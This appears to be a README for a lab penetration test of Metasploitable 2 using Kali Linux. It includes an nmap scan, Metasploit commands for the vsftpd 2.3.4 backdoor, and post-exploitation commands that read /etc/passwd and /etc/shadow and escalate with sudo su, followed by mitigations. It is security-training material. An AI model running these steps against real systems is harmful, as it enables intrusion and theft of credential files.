# 🔐 End-to-End Penetration Testing on Metasploitable 2

## 📌 Overview
This project demonstrates a complete end-to-end penetration testing workflow using Kali Linux against a vulnerable machine (Metasploitable 2). The objective was to simulate a real-world attack scenario in a controlled lab environment, identify vulnerabilities, exploit them, and perform post-exploitation analysis.

---

## 🎯 Objectives
- Perform network scanning and service enumeration  
- Identify vulnerable services and versions  
- Exploit known vulnerabilities using Metasploit  
- Gain root-level access  
- Conduct post-exploitation and extract sensitive system data  

---

## 🧪 Lab Setup
- **Attacker Machine:** Kali Linux  
- **Target Machine:** Metasploitable 2  
- **Virtualization Platform:** VMware Workstation  
- **Network Configuration:** Host-Only / NAT  

---

## 🔍 Scanning & Enumeration

Nmap was used to identify open ports, services, and versions.

**Command used:**
```bash
nmap -A -T4 <target-ip>
```

### Key Findings:
- Port 21: FTP (vsftpd 2.3.4)  
- Port 22: SSH (OpenSSH)  
- Port 23: Telnet  
- Port 80: HTTP (Apache)  
- Port 139/445: SMB  
- Port 3306: MySQL  

The FTP service was identified as vulnerable and selected for exploitation.

---

## 💣 Exploitation

The vulnerability in vsftpd 2.3.4 was exploited using Metasploit.

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target-ip>
run
```

### Result:
- Shell access obtained  
- Root-level access achieved  

---

## 💻 Post Exploitation

After gaining access, system enumeration and data extraction were performed.

```bash
whoami
uname -a
cat /etc/passwd
ps aux
netstat -tulnp
sudo -l
sudo su
cat /etc/shadow
```

### Activities:
- Verified root access  
- Enumerated users  
- Analyzed processes  
- Identified running services  
- Performed privilege escalation  
- Accessed sensitive data  

---

## ⚠ Vulnerabilities Identified
- vsftpd 2.3.4 Backdoor  
- Outdated services  
- Weak access control  
- Multiple exposed ports  

---

## 🛡 Mitigation
- Update vulnerable services  
- Disable unused ports  
- Use strong authentication  
- Restrict sudo access  

---

## 📊 Impact
- Full system compromise  
- Root access gained  
- Sensitive data exposed  

---

## 🛠 Tools Used
- Kali Linux  
- Nmap  
- Metasploit  
- VMware  

---

## ⚠ Disclaimer
This project was performed in a controlled lab environment for educational purposes only.
